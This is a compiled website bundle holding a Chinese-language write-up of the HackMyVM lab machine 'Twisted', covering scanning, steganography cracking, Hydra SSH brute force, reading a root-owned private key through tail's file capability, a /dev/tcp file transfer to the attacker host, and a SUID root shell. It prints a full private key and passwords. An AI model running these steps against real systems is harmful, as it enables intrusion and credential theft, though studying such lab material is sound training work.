"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[9692],{1369:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>d,contentTitle:()=>c,default:()=>h,frontMatter:()=>t,metadata:()=>s,toc:()=>l});const s=JSON.parse('{"id":"HackMyVm/Machines/Twisted","title":"Twisted","description":"\u23f2\ufe0f Release Date // 2020-10-15","source":"@site/docs/HackMyVm/Machines/Twisted.md","sourceDirName":"HackMyVm/Machines","slug":"/HackMyVm/Machines/Twisted","permalink":"/docs/HackMyVm/Machines/Twisted","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/HackMyVm/Machines/Twisted.md","tags":[],"version":"current","frontMatter":{},"sidebar":"HackMyVmSidebar","previous":{"title":"Pwned","permalink":"/docs/HackMyVm/Machines/Pwned"},"next":{"title":"VivifyTech","permalink":"/docs/HackMyVm/Machines/VivifyTech"}}');var a=r(4848),i=r(8453);const t={},c=void 0,d={},l=[{value:"\u4e3b\u673a\u63a2\u6d4b\u548cnmap\u626b\u63cf",id:"\u4e3b\u673a\u63a2\u6d4b\u548cnmap\u626b\u63cf",level:3},{value:"web\u6e17\u900f",id:"web\u6e17\u900f",level:3},{value:"\u767b\u5f55SSH",id:"\u767b\u5f55ssh",level:3},{value:"\u63d0\u6743",id:"\u63d0\u6743",level:3},{value:"Capabilities \u63d0\u6743",id:"capabilities-\u63d0\u6743",level:4},{value:"SUID\u63d0\u6743",id:"suid\u63d0\u6743",level:4}];function o(e){const n={a:"a",blockquote:"blockquote",code:"code",h3:"h3",h4:"h4",img:"img",p:"p",pre:"pre",...(0,i.R)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsxs)(n.blockquote,{children:["\n",(0,a.jsx)(n.p,{children:"\u23f2\ufe0f Release Date // 2020-10-15"}),"\n",(0,a.jsx)(n.p,{children:"\u2714\ufe0f MD5 // 421465f7ccfc34907fd8b7fa38f46dbc"}),"\n",(0,a.jsx)(n.p,{children:"\u2620 Root // 219"}),"\n",(0,a.jsx)(n.p,{children:"\ud83d\udc80 User // 222"}),"\n"]}),"\n",(0,a.jsx)(n.h3,{id:"\u4e3b\u673a\u63a2\u6d4b\u548cnmap\u626b\u63cf",children:"\u4e3b\u673a\u63a2\u6d4b\u548cnmap\u626b\u63cf"}),"\n",(0,a.jsx)(n.p,{children:"\u4e3b\u673a\u63a2\u6d4b"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"nmap -sn 192.168.56.100/24\n"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{children:"Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-26 01:50 EDT\r\nNmap scan report for 192.168.56.100\r\nHost is up (0.00055s latency).\r\nMAC Address: 08:00:27:01:69:57 (Oracle VirtualBox virtual NIC)\r\nNmap scan report for 192.168.56.116\r\nHost is up (0.00019s latency).\r\nMAC Address: 0A:00:27:00:00:1C (Unknown)\r\nNmap scan report for 192.168.56.124\r\nHost is up (0.00059s latency).\r\nMAC Address: 08:00:27:1B:C8:B8 (Oracle VirtualBox virtual NIC)\r\nNmap scan report for 192.168.56.101\r\nHost is up.\r\nNmap done: 256 IP addresses (4 hosts up) scanned in 7.88 seconds\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u8fdb\u884cTCP\u7684\u5168\u7aef\u53e3\u626b\u63cf"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"nmap -sT --min-rate 10000 -p- 192.168.56.124\n"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{children:"PORT     STATE SERVICE\r\n80/tcp   open  http\r\n2222/tcp open  EtherNetIP-1\r\nMAC Address: 08:00:27:1B:C8:B8 (Oracle VirtualBox virtual NIC)\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u8fdb\u884c80\uff0c2222\u7aef\u53e3\u7684\u8be6\u7ec6\u626b\u63cf"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"nmap -sT -sV -sC -O -p80,2222 192.168.56.124\n"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{children:"PORT     STATE SERVICE VERSION\r\n80/tcp   open  http    nginx 1.14.2\r\n|_http-title: Site doesn't have a title (text/html).\r\n|_http-server-header: nginx/1.14.2\r\n2222/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\r\n| ssh-hostkey: \r\n|   2048 67:63:a0:c9:8b:7a:f3:42:ac:49:ab:a6:a7:3f:fc:ee (RSA)\r\n|   256 8c:ce:87:47:f8:b8:1a:1a:78:e5:b7:ce:74:d7:f5:db (ECDSA)\r\n|_  256 92:94:66:0b:92:d3:cf:7e:ff:e8:bf:3c:7b:41:b7:5a (ED25519)\r\nMAC Address: 08:00:27:1B:C8:B8 (Oracle VirtualBox virtual NIC)\r\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\r\nDevice type: general purpose\r\nRunning: Linux 4.X|5.X\r\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\r\nOS details: Linux 4.15 - 5.8\r\nNetwork Distance: 1 hop\r\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n"})}),"\n",(0,a.jsx)(n.p,{children:"2222\u7aef\u53e3\u5f00\u653e\u7684\u662fssh\u670d\u52a1"}),"\n",(0,a.jsx)(n.h3,{id:"web\u6e17\u900f",children:"web\u6e17\u900f"}),"\n",(0,a.jsx)(n.p,{children:"\u8bbf\u95eeweb\u9875\u9762\uff0c\u4e24\u5f20\u56fe\u7247"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"wget http://192.168.56.124/cat-hidden.jpg\r\nwget http://192.168.56.124/cat-original.jpg\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u5229\u7528stegseek\u8fdb\u884c\u5206\u79bb"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:'\u250c\u2500\u2500(root\u327fkali)-[/home/kali/Twisted]\r\n\u2514\u2500# stegseek -wl /usr/share/wordlists/rockyou.txt cat-hidden.jpg\r\nStegSeek 0.6 - https://github.com/RickdeJager/StegSeek\r\n\r\n[i] Found passphrase: "sexymama"\r\n[i] Original filename: "mateo.txt".\r\n[i] Extracting to "cat-hidden.jpg.out".\r\n\u250c\u2500\u2500(root\u327fkali)-[/home/kali/Twisted]\r\n\u2514\u2500# cat cat-hidden.jpg.out \r\nthisismypassword\n'})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:'\u250c\u2500\u2500(root\u327fkali)-[/home/kali/Twisted]\r\n\u2514\u2500# stegseek -wl /usr/share/wordlists/rockyou.txt cat-original.jpg \r\nStegSeek 0.6 - https://github.com/RickdeJager/StegSeek\r\n\r\n[i] Found passphrase: "westlife"\r\n[i] Original filename: "markus.txt".\r\n[i] Extracting to "cat-original.jpg.out".\r\n\u250c\u2500\u2500(root\u327fkali)-[/home/kali/Twisted]\r\n\u2514\u2500# cat cat-original.jpg.out \r\nmarkuslovesbonita\n'})}),"\n",(0,a.jsx)(n.p,{children:"\u5f97\u5230\u4e86\u5f88\u591a\u5173\u952e\u4fe1\u606f\uff0c\u7ec4\u6210\u4e00\u4e2a\u5b57\u5178\uff0c\u5c1d\u8bd5ssh\u7206\u7834"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{children:"sexymama\r\nmateo\r\nwestlife\r\nmarkus\r\nmarkuslovesbonita\r\nthisismypassword\n"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"hydra -L pass -P pass ssh://192.168.56.124:2222\n"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{children:"[2222][ssh] host: 192.168.56.124   login: mateo   password: thisismypassword\r\n[2222][ssh] host: 192.168.56.124   login: markus   password: markuslovesbonita\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u5f97\u5230\u4e24\u5bf9\u51ed\u636e"}),"\n",(0,a.jsx)(n.h3,{id:"\u767b\u5f55ssh",children:"\u767b\u5f55SSH"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"ssh mateo@192.168.56.124 -p2222\n"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"mateo@twisted:~$ cat note.txt \r\n/var/www/html/gogogo.wav\n"})}),"\n",(0,a.jsxs)(n.p,{children:["\u5f97\u5230\u4e00\u4e2a\u97f3\u9891\u6587\u4ef6\uff0c\u91cc\u9762\u662f\u83ab\u65af\u5bc6\u7801\uff0c\u5229\u7528",(0,a.jsx)(n.a,{href:"https://morsecode.world/international/decoder/audio-decoder-adaptive.html",children:"\u5728\u7ebf\u7f51\u7ad9\u63d0\u53d6"})]}),"\n",(0,a.jsx)(n.p,{children:"\u6ca1\u6709\u5f97\u5230\u6709\u7528\u7684\u4fe1\u606f"}),"\n",(0,a.jsx)(n.p,{children:"\u7ee7\u7eed\u770b\u53e6\u4e00\u4e2a\u7528\u6237"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"ssh markus@192.168.56.124 -p2222\n"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"markus@twisted:~$ ls\r\nnote.txt\r\nmarkus@twisted:~$ cat note.txt \r\nHi bonita,\r\nI have saved your id_rsa here: /var/cache/apt/id_rsa\r\nNobody can find it. \r\nmarkus@twisted:~$ cat /var/cache/apt/id_rsa\r\ncat: /var/cache/apt/id_rsa: Permission denied\r\nmarkus@twisted:~$ ls /var/cache/apt/id_rsa -l\r\n-rw------- 1 root root 1823 Oct 14  2020 /var/cache/apt/id_rsa\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u6709\u4e00\u4e2abonita\u7528\u6237\u7684ssh\u79c1\u94a5"}),"\n",(0,a.jsx)(n.h3,{id:"\u63d0\u6743",children:"\u63d0\u6743"}),"\n",(0,a.jsx)(n.h4,{id:"capabilities-\u63d0\u6743",children:"Capabilities \u63d0\u6743"}),"\n",(0,a.jsxs)(n.blockquote,{children:["\n",(0,a.jsx)(n.p,{children:"Capabilities\u673a\u5236\uff0c\u662f\u5728Linux\u5185\u68382.2\u4e4b\u540e\u5f15\u5165\u7684\u3002\u5b83\u5c06root\u7528\u6237\u7684\u6743\u9650\u7ec6\u5206\u4e3a\u4e0d\u540c\u7684\u9886\u57df\uff0c\u53ef\u4ee5\u5206\u522b\u542f\u7528\u6216\u7981\u7528\u3002\u4ece\u800c\uff0c\u5728\u5b9e\u9645\u8fdb\u884c\u7279\u6743\u64cd\u4f5c\u65f6\uff0c\u5982\u679ceuid\u4e0d\u662froot\uff0c\u4fbf\u4f1a\u68c0\u67e5\u662f\u5426\u5177\u6709\u8be5\u7279\u6743\u64cd\u4f5c\u6240\u5bf9\u5e94\u7684capabilities\uff0c\u5e76\u4ee5\u6b64\u4e3a\u4f9d\u636e\uff0c\u51b3\u5b9a\u662f\u5426\u53ef\u4ee5\u6267\u884c\u7279\u6743\u64cd\u4f5c\u3002"}),"\n"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"/usr/sbin/getcap -r / 2>/dev/null\n"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{children:"/usr/bin/ping = cap_net_raw+ep\r\n/usr/bin/tail = cap_dac_read_search+ep\n"})}),"\n",(0,a.jsxs)(n.blockquote,{children:["\n",(0,a.jsx)(n.p,{children:"cap_dac_read_search\u53ef\u4ee5\u7ed5\u8fc7\u6587\u4ef6\u7684\u8bfb\u6743\u9650\u68c0\u67e5\u4ee5\u53ca\u76ee\u5f55\u7684\u8bfb/\u6267\u884c\u6743\u9650\u7684\u68c0\u67e5\uff0c\u5229\u7528\u6b64\u7279\u6027\u6211\u4eec\u53ef\u4ee5\u8bfb\u53d6\u7cfb\u7edf\u4e2d\u7684\u654f\u611f\u4fe1\u606f"}),"\n"]}),"\n",(0,a.jsxs)(n.p,{children:["\u5229\u7528tail\u7684\u6743\u9650\u8bfb\u53d6",(0,a.jsx)(n.code,{children:"id_rsa"})]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"mateo@twisted:~$ tail -n 50 /var/cache/apt/id_rsa\r\n-----BEGIN OPENSSH PRIVATE KEY-----\r\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\r\nNhAAAAAwEAAQAAAQEA8NIseqX1B1YSHTz1A4rFWhjIJffs5vSbAG0Vg2iTa+xshyrmk6zd\r\nFyguFUO7tN2TCJGTomDTXrG/KvWaucGvIAXpgV1lQsQkBV/VNrVC1Ioj/Fx3hUaSCC4PBS\r\nolvmldJg2habNOUGA4EBKlTwfDi+vjDP8d77mF+rvA3EwR3vj37AiXFk5hBEsqr9cWeTr1\r\nvD5282SncYtJb/Zx0eOa6VVFqDfOB7LKZA2QYIbfR7jezOdX+/nlDKX8Xp07wimFuMJpcF\r\ngFnch7ptoxAqe0M0UIEzP+G2ull3m80G5L7Q/3acg14ULnNVs5dTJWPO2Fp7J2qKW+4A5C\r\ntt0G5sIBpQAAA8hHx4cBR8eHAQAAAAdzc2gtcnNhAAABAQDw0ix6pfUHVhIdPPUDisVaGM\r\ngl9+zm9JsAbRWDaJNr7GyHKuaTrN0XKC4VQ7u03ZMIkZOiYNNesb8q9Zq5wa8gBemBXWVC\r\nxCQFX9U2tULUiiP8XHeFRpIILg8FKiW+aV0mDaFps05QYDgQEqVPB8OL6+MM/x3vuYX6u8\r\nDcTBHe+PfsCJcWTmEESyqv1xZ5OvW8PnbzZKdxi0lv9nHR45rpVUWoN84HsspkDZBght9H\r\nuN7M51f7+eUMpfxenTvCKYW4wmlwWAWdyHum2jECp7QzRQgTM/4ba6WXebzQbkvtD/dpyD\r\nXhQuc1Wzl1MlY87YWnsnaopb7gDkK23QbmwgGlAAAAAwEAAQAAAQAuUW5GpLbNE2vmfbvu\r\nU3mDy7JrQxUokrFhUpnJrYp1PoLdOI4ipyPa+VprspxevCM0ibNojtD4rJ1FKPn6cls5gI\r\nmZ3RnFzq3S7sy2egSBlpQ3TJ2cX6dktV8kMigSSHenAwYhq2ALq4X86WksGyUsO1FvRX4/\r\nhmJTiFsew+7IAKE+oQHMzpjMGyoiPXfdaI3sa10L2WfkKs4I4K/v/x2pW78HIktaQPutro\r\nnxD8/fwGxQnseC69E6vdh/5tS8+lDEfYDz4oEy9AP26Hdtho0D6E9VT9T//2vynHLbmSXK\r\nmPbr04h5i9C3h81rh4sAHs9nVAEe3dmZtmZxoZPOJKRhAAAAgFD+g8BhMCovIBrPZlHCu+\r\nbUlbizp9qfXEc8BYZD3frLbVfwuL6dafDVnj7EqpabmrTLFunQG+9/PI6bN+iwloDlugtq\r\nyzvf924Kkhdk+N366FLDt06p2tkcmRljm9kKMS3lBPMu9C4+fgo9LCyphiXrm7UbJHDVSP\r\nUvPg4Fg/nqAAAAgQD9Q83ZcqDIx5c51fdYsMUCByLby7OiIfXukMoYPWCE2yRqa53PgXjh\r\nV2URHPPhqFEa+iB138cSgCU3RxbRK7Qm1S7/P44fnWCaNu920iLed5z2fzvbTytE/h9QpJ\r\nLlecEv2Hx03xyRZBsHFkMf+dMDC0ueU692Gl7YxRw+Lic0PQAAAIEA82v3Ytb97SghV7rz\r\na0S5t7v8pSSYZAW0OJ3DJqaLtEvxhhomduhF71T0iw0wy8rSH7j2M5PGCtCZUa2/OqQgKF\r\neERnqQPQSgM0PrATtihXYCTGbWo69NUMcALah0gT5i6nvR1Jr4220InGZEUWHLfvkGTitu\r\nD0POe+rjV4B7EYkAAAAOYm9uaXRhQHR3aXN0ZWQBAgMEBQ==\r\n-----END OPENSSH PRIVATE KEY-----\n"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"ssh bonita@127.0.0.1 -i id_rsa\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u767b\u5f55\u5230bonita\u7528\u6237"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"bonita@twisted:~$ id\r\nuid=1002(bonita) gid=1002(bonita) groups=1002(bonita)\r\nbonita@twisted:~$ ls\r\nberoot  user.txt\r\nbonita@twisted:~$ cat user.txt \r\nHMVblackcat\n"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"bonita@twisted:~$ file beroot \r\nberoot: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=fecfbde059505a54f66d3229cc9ebb78f997a7ba, not stripped\r\n-rwsrws--- 1 root   bonita 16864 Oct 14  2020 beroot\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u4e0b\u8f7d\u5230\u672c\u5730\uff0c\u9006\u5411\u5206\u6790"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"cat beroot > /dev/tcp/192.168.56.101/1234\r\nnc -lvp 1234 > beroot\n"})}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240526150551131.png",alt:"image-20240526150551131"})}),"\n",(0,a.jsx)(n.p,{children:"\u8be5\u6587\u4ef6\u5177\u6709suid\u6743\u9650\uff0c\u8f93\u51655880\u5373\u53ef\u5f97\u5230root\u7684bash"}),"\n",(0,a.jsx)(n.h4,{id:"suid\u63d0\u6743",children:"SUID\u63d0\u6743"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"bonita@twisted:~$ ./beroot \r\nEnter the code:\r\n 5880\r\nroot@twisted:~# cat /root/root.txt \r\nHMVwhereismycat\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u62ff\u5230root.txt"})]})}function h(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,a.jsx)(n,{...e,children:(0,a.jsx)(o,{...e})}):o(e)}},8453:(e,n,r)=>{r.d(n,{R:()=>t,x:()=>c});var s=r(6540);const a={},i=s.createContext(a);function t(e){const n=s.useContext(i);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:t(e.components),s.createElement(i.Provider,{value:n},e.children)}}}]);